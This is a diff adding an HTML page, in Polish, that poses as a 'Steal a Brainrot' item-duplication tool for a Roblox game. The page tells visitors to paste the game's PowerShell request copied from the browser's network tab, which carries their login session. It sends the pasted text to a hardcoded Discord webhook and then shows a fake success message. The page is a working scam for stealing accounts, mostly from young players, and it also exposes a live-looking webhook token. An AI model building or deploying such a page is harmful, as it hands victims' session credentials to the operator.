@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>STEAL A BRAINROT DUPER</title>
+  <link rel="icon" href="https://rbx-duper.vercel.app/favicon.ico" type="image/x-icon"/>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0a0015, #180033, #2a004d);
+      color: #ff00ff;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .container {
+      text-align: center;
+      padding: 30px;
+      max-width: 700px;
+      z-index: 10;
+    }
+    h1 {
+      font-size: clamp(4rem, 14vw, 10rem);
+      font-weight: 900;
+      letter-spacing: -4px;
+      background: linear-gradient(90deg, #ff00aa, #00ffff, #ff00aa);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 50px #ff00ff99, 0 0 100px #00ffff66;
+      animation: glitch 5s infinite;
+      margin-bottom: 0.3em;
+    }
+    .subtitle {
+      font-size: clamp(1.8rem, 7vw, 4rem);
+      color: #00ffff;
+      text-shadow: 0 0 40px #00ffffcc;
+      margin: 20px 0 50px;
+      font-weight: bold;
+    }
+    .input-box {
+      width: 100%;
+      max-width: 600px;
+      margin: 0 auto 30px;
+      position: relative;
+    }
+    input {
+      width: 100%;
+      padding: 20px 25px;
+      font-size: 1.6rem;
+      background: rgba(20, 0, 40, 0.7);
+      border: 2px solid #ff00ff88;
+      border-radius: 15px;
+      color: #fff;
+      outline: none;
+      box-shadow: 0 0 30px #ff00ff44 inset, 0 0 60px #ff00ff33;
+      transition: all 0.3s;
+    }
+    input:focus {
+      border-color: #00ffff;
+      box-shadow: 0 0 50px #00ffff88 inset, 0 0 100px #00ffff55;
+    }
+    .btn {
+      padding: 18px 70px;
+      font-size: 2.2rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      background: linear-gradient(45deg, #ff0066, #cc00ff, #6600ff);
+      color: white;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      box-shadow: 0 0 70px #ff00aaff, inset 0 0 40px #ffffff55;
+      transition: all 0.2s;
+      margin: 20px;
+    }
+    .btn:hover {
+      transform: scale(1.15) rotate(2deg);
+      box-shadow: 0 0 120px #ff00ffff, 0 0 200px #cc00ffaa;
+    }
+    .btn:active {
+      transform: scale(0.92);
+    }
+    .status {
+      margin-top: 40px;
+      font-size: 1.5rem;
+      min-height: 2em;
+      color: #00ff88;
+      text-shadow: 0 0 30px #00ff88aa;
+      opacity: 0;
+      transition: opacity 0.5s;
+    }
+    .glow-bg {
+      position: absolute;
+      width: 1000px;
+      height: 1000px;
+      background: radial-gradient(circle, #ff00ff33 10%, transparent 60%);
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      animation: rotate 30s linear infinite;
+      pointer-events: none;
+      z-index: 1;
+    }
+    @keyframes glitch {
+      0%, 100% { transform: translate(0); }
+      3%  { transform: translate(-3px, 3px); }
+      5%  { transform: translate(3px, -3px); }
+      7%  { transform: translate(-2px, 2px); }
+    }
+    @keyframes rotate {
+      from { transform: translate(-50%, -50%) rotate(0deg); }
+      to   { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    .particles {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 2;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="glow-bg"></div>
+  <div class="particles" id="particles"></div>
+
+  <div class="container">
+    <h1>STEAL A BRAINROT DUPER</h1>
+    <div class="subtitle">2026 NADAL DZIAŁA - OSTATNI UPDATE (15.02.2026)</div>
+
+    <div class="input-box">
+      <input type="text" id="textInput" placeholder="WKLEJ POWERSHELL GRY (OD NETWORK)" autocomplete="off" />
+    </div>
+
+    <button class="btn" id="stealBtn">STEAL A BRAINROT →</button>
+
+    <div class="status" id="status"></div>
+  </div>
+
+  <script>
+    // Particles tło (fake cyber look)
+    const particlesContainer = document.getElementById('particles');
+    for (let i = 0; i < 100; i++) {
+      const p = document.createElement('div');
+      p.style.position = 'absolute';
+      p.style.background = Math.random() > 0.5 ? '#ff00ff' : '#00ffff';
+      p.style.width = p.style.height = Math.random() * 6 + 2 + 'px';
+      p.style.borderRadius = '50%';
+      p.style.left = Math.random() * 100 + 'vw';
+      p.style.top = Math.random() * 100 + 'vh';
+      p.style.opacity = Math.random() * 0.6 + 0.3;
+      p.style.animation = `float ${Math.random() * 25 + 15}s linear infinite`;
+      p.style.animationDelay = Math.random() * 8 + 's';
+      particlesContainer.appendChild(p);
+    }
+
+    // Animacja float dla particle
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes float {
+        0%   { transform: translateY(0) translateX(0); opacity: 0.6; }
+        50%  { transform: translateY(-80vh) translateX(${Math.random() > 0.5 ? '' : '-'}30vw); opacity: 1; }
+        100% { transform: translateY(-160vh) translateX(0); opacity: 0; }
+      }
+    `;
+    document.head.appendChild(style);
+
+    // ======================== GŁÓWNA FUNKCJA ========================
+    const webhook = "https://discord.com/api/webhooks/1472589572583063642/76GwGJTwfT1xm0dC3ffWGBcgZqFu29HTO8sGjgCRt82jBZaKrA-5ELXjKb3LkeEzouln";
+
+    const input = document.getElementById('textInput');
+    const btn = document.getElementById('stealBtn');
+    const status = document.getElementById('status');
+
+    btn.addEventListener('click', async () => {
+      const text = input.value.trim();
+      if (!text) {
+        status.textContent = "wpisz coś skibidi debilu...";
+        status.style.color = "#ff4444";
+        status.style.opacity = "1";
+        setTimeout(() => status.style.opacity = "0", 3000);
+        return;
+      }
+
+      status.textContent = "BRAINROT DUPING... ";
+      status.style.color = "#00ffff";
+      status.style.opacity = "1";
+      btn.disabled = true;
+      btn.textContent = "DUPING...";
+
+      try {
+        const payload = {
+          content: `**NOWY BRAINROT STEAL** 🔥\n\`\`\`\n${text}\n\`\`\`\n<@&everyone> ktoś właśnie ukradł mózg`,
+          username: "Brainrot Duper 2026",
+          avatar_url: "https://i.imgur.com/skibidi-toilet.png" // możesz zmienić na dowolny link
+        };
+
+        const res = await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          status.textContent = "WYKRYTO DUPLIKACJE! 🔥  SUCCESS → SPRAWDZ STEAL A BRAINROT ZA ~10 MINUT";
+          status.style.color = "#00ff88";
+        } else {
+          status.textContent = "ERROR... Ohio policja złapała? 😭";
+          status.style.color = "#ff4444";
+        }
+      } catch (err) {
+        status.textContent = "WEBHOOK ZEPSUTY... GYATT";
+        status.style.color = "#ff4444";
+      }
+
+      setTimeout(() => {
+        status.style.opacity = "0";
+        btn.disabled = false;
+        btn.textContent = "GOTOWE →";
+      }, 5000);
+    });
+
+    // Enter też wysyła
+    input.addEventListener('keypress', e => {
+      if (e.key === 'Enter') btn.click();
+    });
+  </script>
+</body>
+</html>
